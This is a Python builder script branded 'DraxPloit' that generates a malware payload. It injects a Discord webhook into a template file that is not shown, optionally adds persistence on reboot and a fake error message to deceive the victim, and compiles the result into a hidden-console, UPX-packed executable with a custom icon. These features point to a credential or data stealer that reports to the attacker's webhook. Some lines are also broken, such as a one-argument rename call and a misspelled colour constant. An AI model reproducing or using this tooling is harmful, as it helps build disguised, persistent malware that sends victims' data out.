import os
import shutil
import subprocess
import sys
import requests

from termcolor import cprint
from pyfiglet import figlet_format
from time import sleep
from colorama import Fore, Style, init

class Builder:
    def __init__(self) -> None:
        
        if not self.check():
            exit()
        self.load()
    
        self.webhook = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] Discord Webhook URL: ')
        if not self.check_webhook(self.webhook):
            print(f"{Fore.RED}Invalid Webhook!{Fore.RESET}")
            sys.exit()

        self.testwebhook = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] Test Discord Webhook? (yes/no): ')
        if self.testwebhook.lower() == 'y' or self.testwebhook.lower() == 'yes':
            testwebhookdata = {"content":"Webhook is working."}
            requests.post(self.webhook, json = testwebhookdata)

        self.filename = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] File Name: ')


        self.startup = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] File executes on reboot? (yes/no): ')
        if self.startup.lower() == 'y' or self.startup.lower() == 'yes':
            self.startup = "yes"
        else:
            self.startup = "no"

        self.fakeerror = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] Add fake error? (yes/no): ')
        if self.fakeerror.lower() == 'y' or self.fakeerror.lower() == 'yes':
            self.fakeerror = "yes"
            
            self.fakeerror2 = input(f'  [{Fore.GREEN}FEATURE{Fore.RESET}] Add custom error message? (yes/no): ')
            if self.fakeerror2.lower() == 'y' or self.fakeerror2.lower() == 'yes':
                self.fakeerrorcustom = input(f'    [{Fore.GREEN}FEATURE{Fore.RESET}] Enter custom error message: ')
            else:
                self.fakeerrorcustom = "%fake_error_text%"
        else:
            self.fakeerror = "no"
            self.fakeerrorcustom = "%fake_error_text%"
        

        self.compy = input(f'\n[{Fore.GREEN}FEATURE{Fore.RESET}] Compile file as executable (.exe)? (yes/no): ')

        if self.compy.lower() == 'yes' or self.compy.lower() == 'y':
            self.compy = 'yes'
            self.icon = input(f'  [{Fore.GREEN}FEATURE{Fore.RESET}] Add icon to exe? (yes/no): ')
            if self.icon.lower() == 'yes' or self.icon.lower() == 'y':
                self.icon = 'yes'
                self.icon_exe()
            else:
                pass
        else:
            self.compy = 'no'
            pass

        self.mk_file(self.filename, self.webhook)

        print(f'{Fore.GREEN}File created successful!{Fore.RESET}')

        self.cleanup(self.filename)
        self.renamefile(self.filename)

        input(f'[{Fore.GREEN}END{Fore.RESET}] Your setup was finished. Press Enter to exit.')
        sys.exit()

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def check(self):
        required_files = {'./main.py',
                          './requirements.txt'}

        for file in required_files:
            if not os.path.isfile(file):
                print(f'[{Fore.RED}ERROR{Fore.RESET}] {file} not found!')
                return False

        try:
            print(
                subprocess.check_output(
                    "python -V",
                    stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(f'[{Force.RED}ERROR{Force.RESET}] Python not found!')
            return False

        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')


        return True

    def load(self):
        cprint(figlet_format("DraxPloit", font="standard", width = 100),
               "green", attrs=["bold"])

    def icon_exe(self):
        self.icon_name = input(f'    [{Fore.GREEN}FEATURE{Fore.RESET}] Enter the name of the icon: ')

        if os.path.isfile(f"./{self.icon_name}"):
            pass
        else:
            print(f'[{Fore.RED}ERROR{Fore.RESET}] Icon not found! Notice that it has to be in the current directory!')
            input(f"Press anything to exit...")
            sys.exit()

        if self.icon_name.endswith('.ico'):
            pass
        else:
            print(f'[{Fore.RED}ERROR{Fore.RESET}] Icon must have .ico extension! Please convert it and try again.')
            input(f"Press anything to exit...")

    def renamefile(self, filename):
        try:
            os.rename(f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass

    def mk_file(self, filename, webhook):
        print(f'{Fore.GREEN}File is building...{Fore.RESET}')

        with open('./main.py', 'r', encoding="utf-8") as f:
            code = f.read()

        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%WEBHOOK_HERE%', webhook)
                    .replace("%_startup_enabled%", str(self.startup))
                    .replace("%fake_error_enabled%", str(self.fakeerror))
                    .replace("%fake_error_text%", str(self.fakeerrorcustom)))

        sleep(2)
        print(f'{Fore.GREEN}File code is built{Fore.RESET}')

      

        if self.compy == 'yes':
            self.compile(f"{filename}")
        else:
            pass


    def compile(self, filename):
        print(f'[{Fore.GREEN}FEATURE{Fore.RESET}] Compiling code...{Fore.RESET}')
        if self.icon == 'yes':
            icon = self.icon_name
        else:
            icon = "NONE"
        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./upx -i {icon} --distpath ./ .\\{filename}.py')
        print(f'{Fore.GREEN}Code compiled!{Fore.RESET}')

    def cleanup(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.py', f'./{filename}.spec', f'./compressed_{filename}.py', f'./compressed_{filename}.spec'}

        if self.compy == 'no':
            cleans_file.remove(f'./{filename}.py')
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue


if __name__ == '__main__':
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system("cls")

    Builder()
